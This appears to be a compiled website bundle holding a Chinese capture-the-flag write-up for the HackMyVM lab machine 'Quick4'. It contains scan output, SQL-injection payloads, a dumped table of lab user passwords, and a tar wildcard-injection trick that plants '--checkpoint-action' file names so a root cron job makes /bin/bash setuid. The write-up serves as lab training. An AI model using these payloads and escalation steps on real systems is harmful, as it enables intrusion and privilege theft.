"use strict";(self.webpackChunkguardian_jtz_github_io=self.webpackChunkguardian_jtz_github_io||[]).push([[9918],{30014:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>l,contentTitle:()=>i,default:()=>m,frontMatter:()=>o,metadata:()=>r,toc:()=>c});var a=t(74848),s=t(28453);const o={sidebar_position:11,tags:["Easy","Linux","SQLI","\u6587\u4ef6\u4e0a\u4f20","\u5b9a\u65f6\u4efb\u52a1"],title:"Quick4",description:"Quick4"},i="Quick4",r={id:"box/HackMyVM/Quick4",title:"Quick4",description:"Quick4",source:"@site/docs/box/HackMyVM/Quick4.md",sourceDirName:"box/HackMyVM",slug:"/box/HackMyVM/Quick4",permalink:"/docs/box/HackMyVM/Quick4",draft:!1,unlisted:!1,tags:[{label:"Easy",permalink:"/docs/tags/easy"},{label:"Linux",permalink:"/docs/tags/linux"},{label:"SQLI",permalink:"/docs/tags/sqli"},{label:"\u6587\u4ef6\u4e0a\u4f20",permalink:"/docs/tags/\u6587\u4ef6\u4e0a\u4f20"},{label:"\u5b9a\u65f6\u4efb\u52a1",permalink:"/docs/tags/\u5b9a\u65f6\u4efb\u52a1"}],version:"current",sidebarPosition:11,frontMatter:{sidebar_position:11,tags:["Easy","Linux","SQLI","\u6587\u4ef6\u4e0a\u4f20","\u5b9a\u65f6\u4efb\u52a1"],title:"Quick4",description:"Quick4"},sidebar:"boxSidebar",previous:{title:"Quick3",permalink:"/docs/box/HackMyVM/Quick3"},next:{title:"Quick5",permalink:"/docs/box/HackMyVM/Quick5"}},l={},c=[{value:"\u7aef\u53e3\u626b\u63cf",id:"\u7aef\u53e3\u626b\u63cf",level:2},{value:"HTTP - 80",id:"http---80",level:2},{value:"\u540e\u6e17\u900f",id:"\u540e\u6e17\u900f",level:2},{value:"www-data --&gt; root",id:"www-data----root",level:3}];function u(e){const n={code:"code",h1:"h1",h2:"h2",h3:"h3",img:"img",p:"p",pre:"pre",...(0,s.R)(),...e.components};return(0,a.jsxs)(a.Fragment,{children:[(0,a.jsx)(n.h1,{id:"quick4",children:"Quick4"}),"\n",(0,a.jsx)(n.h2,{id:"\u7aef\u53e3\u626b\u63cf",children:"\u7aef\u53e3\u626b\u63cf"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"\u250c\u2500\u2500(CTF)\u2500(root\u327fkali)-[~/CTF/HackerMyVM]\n\u2514\u2500# nmap -sTCV -p- --min-rate 1000 192.168.0.102\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-16 09:50 EDT\nNmap scan report for espo.hmv (192.168.0.102)\nHost is up (0.020s latency).\nNot shown: 65533 closed tcp ports (conn-refused)\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   256 2e:7a:1f:17:57:44:6f:7f:f9:ce:ab:a1:4f:cd:c7:19 (ECDSA)\n|_  256 93:7e:d6:c9:03:5b:a1:ee:1d:54:d0:f0:27:0f:13:eb (ED25519)\n80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))\n|_http-server-header: Apache/2.4.52 (Ubuntu)\n| http-robots.txt: 1 disallowed entry \n|_/admin/\n|_http-title: Quick Automative - Home\nMAC Address: 08:00:27:AA:84:13 (Oracle VirtualBox virtual NIC)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 11.56 seconds\n"})}),"\n",(0,a.jsx)(n.h2,{id:"http---80",children:"HTTP - 80"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"\u250c\u2500\u2500(CTF)\u2500(root\u327fkali)-[~/CTF/HackerMyVM]\n\u2514\u2500# gobuster dir -u http://192.168.0.102/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x txt,php,html\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.0.102/\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              txt,php,html\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/.html                (Status: 403) [Size: 278]\n/images               (Status: 301) [Size: 315] [--\x3e http://192.168.0.102/images/]\n/index.html           (Status: 200) [Size: 51414]\n/.php                 (Status: 403) [Size: 278]\n/img                  (Status: 301) [Size: 312] [--\x3e http://192.168.0.102/img/]\n/modules              (Status: 301) [Size: 316] [--\x3e http://192.168.0.102/modules/]\n/careers              (Status: 301) [Size: 316] [--\x3e http://192.168.0.102/careers/]\n/css                  (Status: 301) [Size: 312] [--\x3e http://192.168.0.102/css/]\n/lib                  (Status: 301) [Size: 312] [--\x3e http://192.168.0.102/lib/]\n/js                   (Status: 301) [Size: 311] [--\x3e http://192.168.0.102/js/]\n/customer             (Status: 301) [Size: 317] [--\x3e http://192.168.0.102/customer/]\n/404.html             (Status: 200) [Size: 5014]\n/robots.txt           (Status: 200) [Size: 32]\n/fonts                (Status: 301) [Size: 314] [--\x3e http://192.168.0.102/fonts/]\n/employee             (Status: 301) [Size: 317] [--\x3e http://192.168.0.102/employee/]\n/.php                 (Status: 403) [Size: 278]\n/.html                (Status: 403) [Size: 278]\n/server-status        (Status: 403) [Size: 278]\nProgress: 882240 / 882244 (100.00%)\n===============================================================\nFinished\n"})}),"\n",(0,a.jsx)(n.p,{children:"\u76ee\u5f55\u626b\u63cf\u4e4b\u540e\u57fa\u672c\u53ef\u4ee5\u786e\u5b9a\u5b58\u5728\u4e24\u4e2a\u5b50\u7f51\u7ad9, \u4e00\u4e2a\u662f\u7528\u6237\u7f51\u7ad9\u4e00\u4e2a\u662f\u5458\u5de5\u7f51\u7ad9, \u7ecf\u8fc7\u5c1d\u8bd5\u53ef\u4ee5\u53d1\u73b0\u4e00\u4e2a SQL \u6ce8\u5165\u6f0f\u6d1e"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"\u250c\u2500\u2500(CTF)\u2500(root\u327fkali)-[~/CTF/HackerMyVM]\n\u2514\u2500# sqlmap -r sql.txt --risk 3 --level 3\n---\nParameter: #1* ((custom) POST)\n    Type: boolean-based blind\n    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)\n    Payload: email=' OR NOT 6230=6230-- LVua&password=admin&submit=Login\n\n    Type: time-based blind\n    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)\n    Payload: email=' AND (SELECT 3094 FROM (SELECT(SLEEP(5)))jLoL)-- JxvH&password=admin&submit=Login\n---\n"})}),"\n",(0,a.jsx)(n.p,{children:"\u57fa\u4e8e\u5f97\u5230\u5f97 SQL \u6ce8\u5165\u6f0f\u6d1e\u6211\u83b7\u53d6\u5230\u4e86\u5bf9\u4e8e\u7684 User \u6570\u636e\u8868"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"+----+-----------------------------------+---------------------+----------+--------------------+----------------------+\n| id | email                             | name                | role     | password           | profile_picture      |\n+----+-----------------------------------+---------------------+----------+--------------------+----------------------+\n| 1  | info@quick.hmv                    | Quick               | admin    | Qe62W064sgRTdxAEpr | uploads/1_admin.png  |\n| 2  | nick.greenhorn@quick.hmv          | Nick Greenhorn      | employee | C3ho049g4kwxTxuSUA | uploads/2_admin.png  |\n| 3  | andrew.speed@quick.hmv            | Andrew Speed        | employee | o30VfVgts73ibSboUP | uploads/3_andrew.jpg |\n| 4  | jack.black@email.hmv              | Jack Black          | customer | 1Wd35lRnAKMGMEwcsX | <blank>              |\n| 5  | mike.cooper@quick.hmv             | Mike Cooper         | employee | Rh978db3URen64yaPP | uploads/5_mike.jpg   |\n| 6  | j.doe@email.hmv                   | John Doe            | customer | 0i3a8KyWS2IcbmqF02 | <blank>              |\n| 7  | jane_smith@email.hmv              | Jane Smith          | customer | pL2a92Po2ykXytzX7y | <blank>              |\n| 8  | frank@email.hmv                   | Frank Stein         | customer | 155HseB7sQzIpE2dIG | <blank>              |\n| 9  | fred.flinstone@email.hmv          | Fred Flinstone      | customer | qM51130xeGHHxKZWqk | <blank>              |\n| 10 | s.hutson@email.hmv                | Sandra Hutson       | customer | sF217VruHNj6wbjofU | <blank>              |\n| 11 | b.clintwood@email.hmv             | Bill Clintwood      | customer | 2yLw53N0m08OhFyBXx | <blank>              |\n| 12 | j.bond@email.hmv                  | James Bond          | customer | 7wS93MQPiVQUkqfQ5T | <blank>              |\n| 13 | d.trumpet@email.hmv               | Donald Trumpet      | customer | f64KBw7cGvu1BkVwcb | <blank>              |\n| 14 | m.monroe@email.hmv                | Michelle Monroe     | customer | f64KBw7cGvu1BkVwcb | <blank>              |\n| 15 | jeff.anderson@quick.hmv           | Jeff Anderson       | employee | 5dX3g8hnKo7AFNHXTV | uploads/15_jeff.jpg  |\n| 16 | lee.ka-shingn@quick.hmv@quick.hmv | Lee Ka-shing        | employee | am636X6Rh1u6S8WNr4 | uploads/16_lee.jpg   |\n| 17 | laura.johnson@email.hmv           | Laura Johnson       | customer | 95T3OmjOV3gublmR7Z | <blank>              |\n| 18 | coos.busters@quick.hmv            | Coos Busters        | employee | f1CD3u3XVo0uXumGah | uploads/18_coos.jpg  |\n| 19 | n.down@email.hmv                  | Neil Down           | customer | Lj9Wr562vqNuLlkTr0 | <blank>              |\n| 20 | t.green@email.hmv                 | Teresa Green        | customer | 7zQ19L0HhFsivH3zFi | <blank>              |\n| 21 | k.ball@email.hmv                  | Krystal Ball        | customer | k1TI68MmYu8uQHhfS1 | <blank>              |\n| 22 | juan.mecanico@quick.hmv           | Juan Mec\xe1nico       | employee | 5a34pXYDAOUMZCoPrg | uploads/22_juan.jpg  |\n| 23 | john.smith@quick.hmv              | John Smith          | employee | 5Wqio90BLd7i4oBMXJ | uploads/23_john.jpg  |\n| 24 | misty.cupp@email.hmv              | Misty Cupp          | customer | c1P35bcdw0mF3ExJXG | <blank>              |\n| 25 | lara.johnson@quick.hmv            | Lara Johnson        | employee | 5Y7zypv8tl9N7TeCFp | uploads/25_lara.jpg  |\n| 26 | j.daniels@email.hmv               | James Daniels       | customer | yF891teFhjhj0Rg7ds | <blank>              |\n| 27 | dick_swett@email.hmv              | Dick Swett          | customer | y6KA4378EbK0ePv5XN | <blank>              |\n| 28 | a.lucky@email.hmv                 | Anna Lucky          | customer | c1P35bcdw0mF3ExJXG | <blank>              |\n| 29 |  andrew.speed@quick.hmv           | admin1              | customer | admin              | <blank>              |\n| 30 | admin3@qq.com                     | admin3' or 1=1 -- - | customer | admin3             | <blank>              |\n+----+-----------------------------------+---------------------+----------+--------------------+----------------------+\n"})}),"\n",(0,a.jsxs)(n.p,{children:["\u968f\u540e\u53ef\u4ee5\u53d1\u73b0\u4e00\u4e2a\u6587\u4ef6\u4e0a\u4f20\u7684\u4f4d\u7f6e\n",(0,a.jsx)(n.img,{src:"https://raw.githubusercontent.com/JTZ-a/Image/main/img/20240416225705.png",alt:""}),"\n\u4f46\u662f\u5b58\u5728\u4e00\u4e9b\u9650\u5236, \u9700\u8981\u8fdb\u884c ByPass \u624b\u6bb5, \u68c0\u6d4b\u7684\u65b9\u5f0f\u662f\u4f9d\u9760\u6587\u4ef6\u5e7b\u6570\u8fdb\u884c\u64cd\u4f5c\n",(0,a.jsx)(n.img,{src:"https://raw.githubusercontent.com/JTZ-a/Image/main/img/20240416232200.png",alt:""})]}),"\n",(0,a.jsx)(n.h2,{id:"\u540e\u6e17\u900f",children:"\u540e\u6e17\u900f"}),"\n",(0,a.jsx)(n.h3,{id:"www-data----root",children:"www-data --\x3e root"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"(remote) www-data@quick4:/usr/local/bin$ cat backup.sh \n#!/bin/bash\ncd /var/www/html/\ntar czf /var/backups/backup-website.tar.gz *\n(remote) www-data@quick4:/usr/local/bin$ cat /etc/crontab \n# /etc/crontab: system-wide crontab\n# Unlike any other crontab you don't have to run the `crontab'\n# command to install the new version when you edit this file\n# and files in /etc/cron.d. These files also have username fields,\n# that none of the other crontabs do.\n\nSHELL=/bin/sh\n# You can also override PATH, but by default, newer versions inherit it from the environment\n#PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n\n# Example of job definition:\n# .---------------- minute (0 - 59)\n# |  .------------- hour (0 - 23)\n# |  |  .---------- day of month (1 - 31)\n# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...\n# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat\n# |  |  |  |  |\n# *  *  *  *  * user-name command to be executed\n*/1 *   * * *   root    /usr/local/bin/backup.sh\n"})}),"\n",(0,a.jsx)(n.p,{children:"\u67e5\u770b\u5b9a\u65f6\u4efb\u52a1\u53ef\u4ee5\u53d1\u73b0\u4e00\u4e2a root \u5b9a\u65f6\u4efb\u52a1, \u6267\u884c\u4e00\u4e2a\u811a\u672c\u8fd9\u4e2a\u811a\u672c\u5b58\u5728 tar \u7684\u901a\u914d\u7b26\u5229\u7528\u95ee\u9898"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:'(remote) www-data@quick4:/var/www/html$ echo \'chmod u+s /bin/bash\' > root.sh\n(remote) www-data@quick4:/var/www/html$ echo "" > "--checkpoint-action=exec=sh root.sh" \n(remote) www-data@quick4:/var/www/html$ echo "" > --checkpoint=1\n(remote) www-data@quick4:/var/www/html$ ls -al /bin/bash\n-rwxr-xr-x 1 root root 1396520 Jan  6  2022 /bin/bash\n(remote) www-data@quick4:/var/www/html$ ls -al /bin/bash\n-rwsr-xr-x 1 root root 1396520 Jan  6  2022 /bin/bash\n'})})]})}function m(e={}){const{wrapper:n}={...(0,s.R)(),...e.components};return n?(0,a.jsx)(n,{...e,children:(0,a.jsx)(u,{...e})}):u(e)}},28453:(e,n,t)=>{t.d(n,{R:()=>i,x:()=>r});var a=t(96540);const s={},o=a.createContext(s);function i(e){const n=a.useContext(o);return a.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function r(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(s):e.components||s:i(e.components),a.createElement(o.Provider,{value:n},e.children)}}}]);